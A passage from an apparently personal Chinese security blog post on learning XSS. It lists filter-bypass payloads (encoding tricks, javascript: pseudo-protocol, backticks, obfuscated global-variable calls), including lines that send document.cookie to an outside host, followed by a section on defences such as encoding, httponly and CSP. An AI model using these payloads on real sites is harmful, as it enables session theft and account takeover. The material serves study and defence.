+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">st</span>/**/<span class="attr">src</span> =<span class="string">&quot;x&quot;</span>/**/<span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>还有一个<code>/</code>也可以替代空格：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=&quot;window.open(&#x27;xxxx&#x27;+document.cookie)&quot;&gt;<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>一些url编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%0a</span><br><span class="line">%0d</span><br><span class="line">%09</span><br><span class="line">%20</span><br><span class="line">%00</span><br></pre></td></tr></table></figure>
+<h2><span id="绕javascript伪协议"> 绕javascript伪协议</span></h2>
+<p><code>\r \n \t</code></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">javas\rcript:self[Object.keys(self)[6]](sessionStorage.getItem(&#x27;_diskSessionId&#x27;))//</span><br><span class="line"></span><br><span class="line">// http://example.com/redirect?url=javascript:alert()</span><br><span class="line">document.location = &#x27;javasc\tript:alert(123)&#x27;</span><br><span class="line">document.location = &#x27;javasc\rript:alert(123)&#x27;</span><br><span class="line">document.location = &#x27;javasc\nript:alert(123)&#x27;</span><br></pre></td></tr></table></figure>
+<h2><span id="绕括号"> 绕括号</span></h2>
+<p>利用反引号</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alert<span class="string">`1`</span></span><br><span class="line">prompt<span class="string">`<span class="subst">$&#123;<span class="variable language_">document</span>.cookie&#125;</span>`</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onerror</span>=alert;<span class="keyword">throw</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;javascript:window.onerror=alert;throw 1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">onerror</span>=alert;<span class="keyword">throw</span> <span class="number">1</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">document.location.href=&#x27;http://xxx:7777/&#x27;+document.cookie</span><br></pre></td></tr></table></figure>
+<h2><span id="绕长度限制"> 绕长度限制</span></h2>
+<ul>
+<li><code>location.hash.substr(1)</code></li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="built_in">eval</span>(location.<span class="property">hash</span>.<span class="title function_">substr</span>(<span class="number">1</span>));</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>用户如果带上<code>#xxxxx</code>来访问包含有这个恶意脚本的界面，就会执行<code>xxxxx</code>的内容</p>
+<ul>
+<li>
+<p>使用 <code>import('//domain/file')</code>，这个需要使用同样的协议，加载的js的响应头中的<code>content-type</code>为<code>application/javascript</code>而且允许跨域加载<code>Access-Control-Allow-Origin: *</code><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/urbrLPstrLjrMyul7a4jpQ">实战环境中的一些XSS小技巧 (qq.com)</a></p>
+</li>
+<li>
+<p>使用一些特殊编码,例如: ㏕ -&gt; mil  |  Ⅷ -&gt; VIII | ㏒ -&gt; log 等等… 比如<code>&lt;script/src=//⑭.₨&gt;</code>，只有18个字符。其中<code>₨</code>代表印度卢比，这是1个字符，而不是2个字符，而<code>⑭</code>也是类似的效果。当受害者点击这个的时候会被跳转到<code>14.rs</code>，而14.rs上放我们的恶意js脚本：</p>
+</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;;var msgbox;if(location.hash)&#123;eval(location.hash.slice(1))&#125;else&#123;alert(1)&#125;//<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;xxx://&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;if(location.hash)&#123;eval(location.hash.slice(1))&#125;else&#123;alert(1)&#125;&quot;</span>&gt;</span></span><br><span class="line">msgbox+1</span><br></pre></td></tr></table></figure>
+<p>更多的unicode字符：<a target="_blank" rel="noopener" href="https://www.fuhaoku.net/danweifuhao/">https://www.fuhaoku.net/danweifuhao/</a></p>
+<h2><span id="利用js全局变量绕过"> 利用JS全局变量绕过</span></h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">window</span><br><span class="line">self</span><br><span class="line">_self</span><br><span class="line">this</span><br><span class="line">top</span><br><span class="line">parent</span><br><span class="line">frames</span><br></pre></td></tr></table></figure>
+<p>比如payload：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>[<span class="string">&quot;document&quot;</span>][<span class="string">&quot;cookie&quot;</span>]</span><br><span class="line"><span class="variable language_">window</span>[<span class="string">&quot;alert&quot;</span>](<span class="variable language_">window</span>[<span class="string">&quot;document&quot;</span>][<span class="string">&quot;cookie&quot;</span>])</span><br><span class="line"></span><br><span class="line">self[<span class="string">&quot;alert&quot;</span>](self[<span class="string">&quot;document&quot;</span><span class="comment">/*xxx*/</span>][<span class="string">&quot;cookie&quot;</span>])</span><br><span class="line">self[<span class="string">&quot;ale&quot;</span>+<span class="string">&quot;rt&quot;</span>](self[<span class="string">&quot;doc&quot;</span>+<span class="string">&quot;ument&quot;</span>][<span class="string">&quot;coo&quot;</span>+<span class="string">&quot;kie&quot;</span>])</span><br><span class="line">self[<span class="string">&quot;\x61\x6c\x65\x72\x74&quot;</span>](self[<span class="string">&quot;\x64\x6f\x63\x75\x6d\x65\x6e\x74&quot;</span>][<span class="string">&quot;\x63\x6f\x6f\x6b\x69\x65&quot;</span>])</span><br><span class="line">self[<span class="string">&quot;\x65\x76\x61\x6c&quot;</span>](self[<span class="string">&quot;\x61\x74\x6f\x62&quot;</span>](<span class="string">&quot;ZG9jdW1lbnQuY29va2ll&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// Jquery</span></span><br><span class="line">self[<span class="string">&quot;$&quot;</span>][<span class="string">&quot;globalEval&quot;</span>](<span class="string">&quot;alert(1)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 高级用法，不出现alert等关键词，遍历全局变量找到对应的函数</span></span><br><span class="line">c=<span class="number">0</span>; <span class="keyword">for</span>(i <span class="keyword">in</span> self) &#123; <span class="keyword">if</span>(i == <span class="string">&quot;alert&quot;</span>) &#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(c); &#125; c++; &#125;   <span class="comment">// 先搜索到alert函数的id</span></span><br><span class="line">self[<span class="title class_">Object</span>.<span class="title function_">keys</span>(self)[<span class="number">5</span>]](<span class="string">&quot;foo&quot;</span>) <span class="comment">// alert(&quot;foo&quot;)</span></span><br><span class="line"></span><br><span class="line">a=<span class="function">()=&gt;</span>&#123;c=<span class="number">0</span>;<span class="keyword">for</span>(i <span class="keyword">in</span> self)&#123;<span class="keyword">if</span>(<span class="regexp">/^a[rel]+t$/</span>.<span class="title function_">test</span>(i))&#123;<span class="keyword">return</span> c&#125;c++&#125;&#125; <span class="comment">// 正则表达式匹配出alert然后定义函数a为alert</span></span><br><span class="line">self[<span class="title class_">Object</span>.<span class="title function_">keys</span>(self)[<span class="title function_">a</span>()]](<span class="string">&quot;foo&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>一个字符转十六进制的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">result = []</span><br><span class="line">a = <span class="built_in">input</span>(<span class="string">&quot;\t\t: &quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    result.append(binascii.b2a_hex(i.encode()))</span><br><span class="line"></span><br><span class="line">result = [i.decode() <span class="keyword">for</span> i <span class="keyword">in</span> result]</span><br><span class="line">result = <span class="string">&quot;\\x&quot;</span>.join(result)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;\\x&quot;</span> + result)</span><br></pre></td></tr></table></figure>
+<h1><span id="常规防御"> 常规防御</span></h1>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">字符</th>
+<th style="text-align:center">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><code>｜</code></td>
+<td style="text-align:center">西文竖线符号</td>
+</tr>
+<tr>
+<td style="text-align:center">&amp;</td>
+<td style="text-align:center">&amp; 符号</td>
+</tr>
+<tr>
+<td style="text-align:center">;</td>
+<td style="text-align:center">分号</td>
+</tr>
+<tr>
+<td style="text-align:center">$</td>
+<td style="text-align:center">美元符号</td>
+</tr>
+<tr>
+<td style="text-align:center">%</td>
+<td style="text-align:center">百分比符号</td>
+</tr>
+<tr>
+<td style="text-align:center">@</td>
+<td style="text-align:center">at 符号</td>
+</tr>
+<tr>
+<td style="text-align:center">’</td>
+<td style="text-align:center">单引号</td>
+</tr>
+<tr>
+<td style="text-align:center">&quot;</td>
+<td style="text-align:center">引号</td>
+</tr>
+<tr>
+<td style="text-align:center">'</td>
+<td style="text-align:center">反斜杠转义单引号</td>
+</tr>
+<tr>
+<td style="text-align:center">&quot;</td>
+<td style="text-align:center">反斜杠转义引号</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>&lt;&gt;</code></td>
+<td style="text-align:center">尖括号</td>
+</tr>
+<tr>
+<td style="text-align:center">()</td>
+<td style="text-align:center">括号</td>
+</tr>
+<tr>
+<td style="text-align:center">+</td>
+<td style="text-align:center">加号</td>
+</tr>
+<tr>
+<td style="text-align:center">CR</td>
+<td style="text-align:center">回车符，ASCII 0x0d</td>
+</tr>
+<tr>
+<td style="text-align:center">LF</td>
+<td style="text-align:center">换行，ASCII 0x0a</td>
+</tr>
+<tr>
+<td style="text-align:center">,</td>
+<td style="text-align:center">逗号</td>
+</tr>
+<tr>
+<td style="text-align:center">\</td>
+<td style="text-align:center">反斜杠</td>
+</tr>
+<tr>
+<td style="text-align:center">=</td>
+<td style="text-align:center">等号</td>
+</tr>
+</tbody>
+</table>
+<h2><span id="验证用户的输入类型-长度-内容"> 验证用户的输入类型、长度、内容</span></h2>
+<ul>
+<li>比如要求的是整数，就用intval强转</li>
+<li>比如需要手机号，就判断是否是11位的数字</li>
+<li>如果数据内容是邮箱，就利用正则表达式匹配邮箱的组成</li>
+</ul>
+<h2><span id="编码"> 编码</span></h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&amp; --&gt; &amp;amp;</span><br><span class="line">&lt; --&gt; &amp;lt;</span><br><span class="line">&gt; --&gt; &amp;gt;</span><br><span class="line">&quot; --&gt; &amp;quot;</span><br><span class="line">&#x27; --&gt; &amp;#x27;</span><br><span class="line">/ --&gt; &amp;#x2F;</span><br></pre></td></tr></table></figure>
+<h2><span id="httponly"> httponly</span></h2>
+<p>这个cookie禁止js读取某些敏感cookie，使得完成了xss也无法获得数据</p>
+<p>http only无法完全防御xss漏洞，之规定了js不能够去获取cookie的内容</p>
+<p>所以它只能够防御用于获取cookie的问题</p>
+<blockquote>
+<p>httponly在某些情况下也能够获得cookie</p>
+<p>比如apache的400情况下应答存在缺陷等</p>
+<p>trace协议</p>
+</blockquote>
+<h2><span id="csp"> CSP</span></h2>
+<p>不提了，这个csp把我橄榄了不知道多少次</p>
+<p><strong>csp本质就是白名单，告诉客户端哪些东西可以加载和执行</strong></p>
+<h1><span id="富文本编辑器xss修复"> 富文本编辑器XSS修复</span></h1>
+<p>富文本编辑器本身支持部分标签，也就是说如果它必须至少要支持<code>&lt;</code>和<code>&gt;</code>才能够进行正常使用</p>
+<p>所以可以从以下几个方面来进行修复：</p>
+<ul>
+<li>设置标签白名单，如仅允许<code>&lt;a&gt;</code>、<code>&lt;img&gt;</code>等必要标签</li>
+<li>为白名单标签的属性设置白名单，例如<code>&lt;a&gt;</code>只允许使用<code>href</code>等</li>
+<li>限制这些<code>href</code>等属性内的输入，防止伪协议造成xss漏洞，禁止出现<code>on.*</code>等事件属性，就比如下面这种</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:confirm(&#x27;xxx&#x27;)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h1><span id="url可控"> URL可控</span></h1>
+<p>某些地方URL可控，所以利用javascript伪协议可以触发xss：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;&#123;xss payload&#125;&quot;&gt;Test&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<p>修复方式：</p>
+<ul>
+<li>验证url是否合法，以http(s)😕/开头，如果不是就自动添加或者拒绝请求</li>
+<li>对http(s)😕/后的内容进行url编码处理</li>
+</ul>
+<h1><span id="jsonp"> JSONP</span></h1>
+<p>可能会利用<code>callback</code>函数修改xss语句导致xss漏洞</p>
+<p>修复方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: application/json; charset=utf-8</span><br></pre></td></tr></table></figure>
+</div>
+        </div>
+        
+            <div class="kratos-copyright text-center clearfix">
+                <h5 itemprop="copyrightNotice">本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
+            </div>
+        
+        <footer class="kratos-entry-footer clearfix">
+            
+                <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                
+                    <a class="donate" href="javascript:;"><i class="fa fa-bitcoin"></i> 打赏</a>
+                
+                
+                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
+                    <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
+                text: "http://example.com/posts/20141.html",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "http://example.com/posts/20141.html";
+            const title         = "「xss学习」";
+            const excerpt       = `再不学xss就要被学弟狠狠超了:(`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                
+                </div>
+            
+            <div class="footer-tag clearfix">
+                <div class="pull-left">
+                <i class="fa fa-tags"></i>
+                    <a class="tag-none-link" href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/" rel="tag">基础漏洞</a>
+                </div>
+                <div class="pull-date">
+                    <time datetime="2024-04-18T09:46:16.772Z" itemprop="dateModified">最后编辑：2024-04-18</time>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+        <nav class="navigation post-navigation clearfix" role="navigation">
+            
+            <div class="nav-previous clearfix">
+                <a title=" java基础-javassist" href="/posts/8201.html">&lt; 上一篇</a>
+            </div>
+            
+            
+        </nav>
+    
+    
+        <div id="v-comments" class="post-comments bg-image"></div>
+<script>
+    var load_comm = () => {
+        const init = () => {
+            new Valine({
+                el: '#v-comments',
+                appId: 'bNjjbBH5XN8401rWT4xZhbCF-gzGzoHsz',
+                appKey: 'R4c5rtiMieN1Kb3frShXDfw8',
+                visitor: true,
+                enableQQ: false,
+                path: '/posts/20141.html'
+                
+            });
+        }
+        if (typeof Valine === 'undefined') {
+            const src = '/vendors/valine@1.4.18/dist/Valine.min.js';
+            $.getScript(src, init);
+        } else {
+            init();
+        }
+    };
+</script>
+
+
+<script>
+<style>
+    .v .veditor{min-height: 10rem;
+        background-image: url(https://cdn.jsdelivr.net/gh/cungudafa/img/images/girls2.png);
+        background-size: contain;
+        background-repeat: no-repeat;
+        background-position: right;
+        background-color: rgba(255,255,255,0);
+        resize: none;}
+</style>
+</script>
+
+
+    <script>
+        new Valine({
+            el: '#vcomments',
+            lang: 'zh-cn',
+            admin_email: '83635877@qq.com',//博主邮箱
+            appId: "",
+            appKey: "",
+            path: window.location.pathname,
+            comment_count: true,
+            //notify: false, // 邮件提醒!使用第三方就不要添加这个!!
+            //verify: true, //验证码
+            avatar: 'monsterid',//小怪物头像
+            placeholder: "qwq~"
+        });
+        
+</script>
+    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+    <script type="text/javascript">
+        jinrishici.load(function(result) {
+            var jrsc_plac =  result.data.content + "\n「" + result.data.origin.title + "」" + result.data.origin.dynasty + " · " + result.data.origin.author;
+            document.getElementById("veditor").setAttribute("placeholder",jrsc_plac);
+        })
+    </script>
+
+<noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://valine.js.org/">comments powered by Valine.</a></noscript>
+
+    
+</article>
+
+        
+
+            </section>
+
+        
+
+        <script src="./js/src/Valine.min.js"></script>   
+        
+        
+            
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/Oscar.jpg" loading="lazy" decoding="auto" />
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center"></p>
+    </div>
+    <div class="site-meta">
+        <a class="meta-item" href="/archives/">
+            <span class="title">
+                文章
+            </span>
+            <span class="count">
+                50
+            </span>
+        </a>
+        <a class="meta-item" href="/categories/">
+            <span class="title">
+                分类
+            </span>
+            <span class="count">
+                11
+            </span>
+        </a>
+        <a class="meta-item" href="/tags/">
+            <span class="title">
+                标签
+            </span>
+            <span class="count">
+                12
+            </span>
+        </a>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                
+  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
+    <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">7</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/java/">java</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Misc/">CTF Misc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Web/">CTF Web</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Web-WriteUp/">CTF Web WriteUp</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-WriteUp/">CTF WriteUp</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Intro/">Intro</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java/">Java</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/java/">java</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A%E7%B3%BB%E5%88%97/">不务正业系列</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">基础漏洞</a><span class="category-list-count">15</span></li></ul>
+  </aside>
+
+
+            
+                
+  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
+    <h4 class="widget-title"><i class="fa fa-tags"></i>标签聚合</h4>
+      <div class="tag-clouds">
+        <a href="/tags/Introduce-Myself/" style="font-size: 0.6em;">Introduce_Myself</a> <a href="/tags/Java/" style="font-size: 0.6em;">Java</a> <a href="/tags/Misc/" style="font-size: 0.6em;">Misc</a> <a href="/tags/POST/" style="font-size: 0.7em;">POST</a> <a href="/tags/RCE/" style="font-size: 0.7em;">RCE</a> <a href="/tags/SQL-Injection/" style="font-size: 0.73em;">SQL_Injection</a> <a href="/tags/Upload/" style="font-size: 0.6em;">Upload</a> <a href="/tags/Web/" style="font-size: 0.8em;">Web</a> <a href="/tags/java/" style="font-size: 0.63em;">java</a> <a href="/tags/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A/" style="font-size: 0.6em;">不务正业</a> <a href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/" style="font-size: 0.77em;">基础漏洞</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 0.67em;">渗透</a>
+      </div>
+  </aside>
+
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
+            <a class="list-group-item" href="/posts/20141.html"><i class="fa  fa-book"></i> xss学习</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/posts/8201.html"><i class="fa  fa-book"></i> java基础-javassist</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/posts/49039.html"><i class="fa  fa-book"></i> Thymeleaf ssti</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/posts/6701.html"><i class="fa  fa-book"></i> PicoCTF2024 Web Writeup</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/posts/40439.html"><i class="fa  fa-book"></i> NKCTF2024 Write Up</a>
+            
+          
+        
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer"  class="ap-lrc"  >
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        <li><a target="_blank" rel="nofollow" href="https://weibo.com/u/HyDr0genSpectRuM"><i class="fa fa-weibo"></i></a></li>
+                        
+                        
+                        <li><a target="_blank" rel="nofollow" href="https://twitter.com/Err0r2333"><i class="fa fa-twitter"></i></a></li>
+                        
+                        
+                        
+                        <li><a target="_blank" rel="nofollow" href="https://github.com/Err0r233"><i class="fa fa-github"></i></a></li>
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2024 Err0r233 版权所有.</li>
+                            <li>本站已运行<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
+                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by Err0r2333.</li>
+                        </div>
+                        <div>
+                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
+                            <li>Hosted on <a href="https://github.io" target="_blank">Github Pages</a></li>
+                        </div>
+                        <div>
+                            
+                            
+                        </div>
+                        <div id="binft"></div>
+  <script>
+    var binft = function (r) {
+      function t() {
+        return b[Math.floor(Math.random() * b.length)]
+      }  
+      function e() {
+        return String.fromCharCode(94 * Math.random() + 33)
+      }
+      function n(r) {
+        for (var n = document.createDocumentFragment(), i = 0; r > i; i++) {
+          var l = document.createElement("span");
+          l.textContent = e(), l.style.color = t(), n.appendChild(l)
+        }
+        return n
+      }
+      function i() {
+        var t = o[c.skillI];
+        c.step ? c.step-- : (c.step = g, c.prefixP < l.length ? (c.prefixP >= 0 && (c.text += l[c.prefixP]), c.prefixP++) : "forward" === c.direction ? c.skillP < t.length ? (c.text += t[c.skillP], c.skillP++) : c.delay ? c.delay-- : (c.direction = "backward", c.delay = a) : c.skillP > 0 ? (c.text = c.text.slice(0, -1), c.skillP--) : (c.skillI = (c.skillI + 1) % o.length, c.direction = "forward")), r.textContent = c.text, r.appendChild(n(c.prefixP < l.length ? Math.min(s, s + c.prefixP) : Math.min(s, t.length - c.skillP))), setTimeout(i, d)
+      }
+      var l = "",
+      o = ["青青陵上柏，磊磊涧中石。", "人生天地间，忽如远行客。","斗酒相娱乐，聊厚不为薄。", "驱车策驽马，游戏宛与洛。","洛中何郁郁，冠带自相索。","长衢罗夹巷，王侯多第宅。","两宫遥相望，双阙百余尺。","极宴娱心意，戚戚何所迫？"].map(function (r) {
+      return r + ""
+      }),
+      a = 2,
+      g = 1,
+      s = 5,
+      d = 75,
